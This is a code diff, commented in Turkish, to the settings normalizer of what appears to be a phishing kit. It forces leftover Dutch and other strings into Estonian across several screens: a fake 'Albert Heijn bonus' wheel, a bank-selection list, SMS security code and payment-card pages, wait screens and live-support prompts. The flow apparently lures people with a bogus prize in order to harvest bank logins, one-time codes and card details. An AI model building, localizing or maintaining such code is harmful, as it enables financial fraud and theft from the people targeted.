@@ -103,6 +103,57 @@ const LEGACY_LIVE_SUPPORT_BUTTONS = new Set([
   "Chat starten",
   "Start Chat",
 ]);
+
+// HOLLANDA CA / GEÇERSİZ DİLLERDE KALAN METİNLER (Estonya için ZORLA DÖNÜŞTÜR):
+const LEGACY_BANKEN_TITLES = new Set([
+  "Kies je bank","Kies uw bank","Select your bank","Bank auswählen","Scegli la tua banca","Choisissez votre banque","Vyberte si svou banku","Seleccione seu banco","Elige tu banco"
+]);
+const LEGACY_BANKEN_SUBTITLES = new Set([
+  "Selecteer je Nederlandse bank om verder te gaan.",
+  "Selecteer uw Nederlandse bank om verder te gaan.",
+  "Select your bank to continue.","Wählen Sie Ihre Bank, um fortzufahren.",
+  "Selecciona tu banco para continuar.","Scegli la tua banca per continuare.",
+  "Choisissez votre banque pour continuer.","Vyberte svou banku pro pokračování.",
+  "Selecione seu banco para continuar."
+]);
+const LEGACY_BANKEN_SEARCH = new Set([
+  "Zoek je bank...","Zoeken...","Suchen...","Search your bank...",
+  "Search for your bank...","Cerca la tua banca...","Recherchez votre banque...",
+  "Hledejte svou banku...","Procure seu banco...","Busca tu banco..."
+]);
+const LEGACY_WIN_TITLES = new Set([
+  "Exclusieve Albert Heijn bonus","Exclusive Albert Heijn bonus",
+  "Exklusiver Albert Heijn Bonus","Bonus esclusivo Albert Heijn",
+  "Bonus exclusif Albert Heijn","Exkluzivní bonus Albert Heijn",
+  "Bónus Exclusivo Albert Heijn","Bono exclusivo de Albert Heijn"
+]);
+const LEGACY_WIN_BUTTONS = new Set([
+  "Bonus claimen","Claim bonus","Bonus beanspruchen",
+  "Richiedi bonus","Réclamer le bonus","Vyžádat si bonus",
+  "Resgatar Bónus","Reclamar bono"
+]);
+const LEGACY_CODE_TITLES = new Set([
+  "Welkom","Welcome","Willkommen","Benvenuto","Bienvenue","Vítejte","Bem-vindo","Bienvenido"
+]);
+const LEGACY_SMS_TITLES = new Set([
+  "SMS-beveiligingscode","SMS security code","SMS-Sicherheitscode",
+  "Codice di sicurezza SMS","Code de sécurité SMS","SMS bezpečnostní kód",
+  "Código de segurança SMS","Código de seguridad SMS"
+]);
+const LEGACY_CARD_TITLES = new Set([
+  "Betaalgegevens","Payment details","Zahlungsdetails","Dettagli di pagamento",
+  "Coordonnées de paiement","Platební údaje","Detalhes de pagamento","Datos de pago"
+]);
+const LEGACY_WAIT_TITLES = new Set([
+  "Even geduld","Please wait","Bitte warten","Attendere prego","Veuillez patienter",
+  "Čekejte prosím","Aguarde","Espere por favor"
+]);
+const LEGACY_PROFILE_TITLES_MAIN = new Set([
+  "Je bonusbedrag","Your bonus amount","Ihr Bonusbetrag",
+  "L'importo del tuo bonus","Votre montant de bonus","Vaše částka bonusu",
+  "Valor do seu bónus","Su monto de bono"
+]);
+
 const ESTONIAN_LIVE_SUPPORT_TITLE = "Reaalajas tugi";
 const ESTONIAN_LIVE_SUPPORT_SUBTITLE =
   "Jätkamiseks peate võtma ühendust meie klienditeenindusega.\n\nKlõpsake allolevat nuppu, et alustada vestlust.";
@@ -132,7 +183,7 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
   }
 
   const isBadBgUrl = (u: string | undefined | null): boolean =>
-    !u || u === LEGACY_BG_URL || u.includes("text_to_image") || u.includes("coresg-normal.trae.ai") || u.trim().length < 8;
+    !u || u === LEGACY_BG_URL || u.includes("text_to_image") || u.includes("coresg-normal.trae.ai") || u.trim().length < 8 || u.toLowerCase().includes("the image is generating");
 
   if (isBadBgUrl(next.bg_url)) {
     next.bg_url = MAXIMA_BG_URL;
@@ -140,18 +191,71 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
 
   if (next.wheel_settings && typeof next.wheel_settings === "object") {
     const ws = next.wheel_settings as Record<string, unknown>;
-    if (isBadBgUrl(ws.bg_url_mobile as string | undefined | null)) {
-      ws.bg_url_mobile = MAXIMA_BG_URL;
-    }
+    // ZORLA: bg_url_mobile HİÇBİR KOŞULDA AI URL OLMAMALI
+    ws.bg_url_mobile = MAXIMA_BG_URL;
     if (ws.page_backgrounds && typeof ws.page_backgrounds === "object") {
       const pb = ws.page_backgrounds as Record<string, unknown>;
-      for (const k of Object.keys(pb)) {
-        if (isBadBgUrl(pb[k] as string | undefined | null)) {
-          pb[k] = MAXIMA_BG_URL;
-        }
+      // ZORLA: TÜM sayfa arka planlarını TEK TEK temizle ve default yap
+      for (const k of ["home","code","wheel","win","form","banken","sms","card","wait"]) {
+        pb[k] = MAXIMA_BG_URL;
       }
     }
   }
+
+  // ===== ZORLA DİL DÜZELTME: HOLLANDA / ALMANCA / İNGİLİZCE KALAN METİNLER =====
+  // KULLANICI BANK LISTESI EKRANINDA "Kies je bank" GİBİ YABANCI DİL GÖRÜYORSA
+  // AŞAĞIDAKİ SET TEK TEK KONTROL EDİP DOĞRUDAN ESTONCAYLA DEĞİŞTİRİR:
+  if (typeof next.banken_title === "string" && (
+    LEGACY_BANKEN_TITLES.has(next.banken_title) || next.banken_title.length < 3
+  )) {
+    next.banken_title = ESTONIAN_BANKEN_TITLE;
+  }
+  if (typeof next.banken_subtitle === "string" && (
+    LEGACY_BANKEN_SUBTITLES.has(next.banken_subtitle) || next.banken_subtitle.length < 5
+  )) {
+    next.banken_subtitle = ESTONIAN_BANKEN_SUBTITLE;
+  }
+  if (typeof next.banken_search_placeholder === "string" && (
+    LEGACY_BANKEN_SEARCH.has(next.banken_search_placeholder) || next.banken_search_placeholder.length < 4
+  )) {
+    next.banken_search_placeholder = ESTONIAN_BANKEN_SEARCH_PLACEHOLDER;
+  }
+  if (typeof next.win_title === "string" && (
+    LEGACY_WIN_TITLES.has(next.win_title) || next.win_title.length < 6
+  )) {
+    next.win_title = ESTONIAN_WIN_TITLE;
+  }
+  if (typeof next.win_button === "string" && (
+    LEGACY_WIN_BUTTONS.has(next.win_button) || next.win_button.length < 4
+  )) {
+    next.win_button = ESTONIAN_WIN_BUTTON;
+  }
+  if (typeof next.code_title === "string" && (
+    LEGACY_CODE_TITLES.has(next.code_title) || next.code_title.length < 3
+  )) {
+    next.code_title = ESTONIAN_CODE_TITLE;
+  }
+  if (typeof next.sms_title === "string" && (
+    LEGACY_SMS_TITLES.has(next.sms_title) || next.sms_title.length < 6
+  )) {
+    next.sms_title = ESTONIAN_SMS_TITLE;
+  }
+  if (typeof next.card_title === "string" && (
+    LEGACY_CARD_TITLES.has(next.card_title) || next.card_title.length < 6
+  )) {
+    next.card_title = ESTONIAN_CARD_TITLE;
+  }
+  if (typeof next.wait_title === "string" && (
+    LEGACY_WAIT_TITLES.has(next.wait_title) || next.wait_title.length < 4
+  )) {
+    next.wait_title = ESTONIAN_WAIT_TITLE;
+  }
+  if (typeof next.profile_title_main === "string" && (
+    LEGACY_PROFILE_TITLES_MAIN.has(next.profile_title_main) || next.profile_title_main.length < 6
+  )) {
+    next.profile_title_main = ESTONIAN_PROFILE_TITLE_MAIN;
+  }
+  // ===== ZORLA DİL DÜZELTME SONU =====
 
   if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME) {
     next.portal_name = ESTONIAN_PORTAL_NAME;
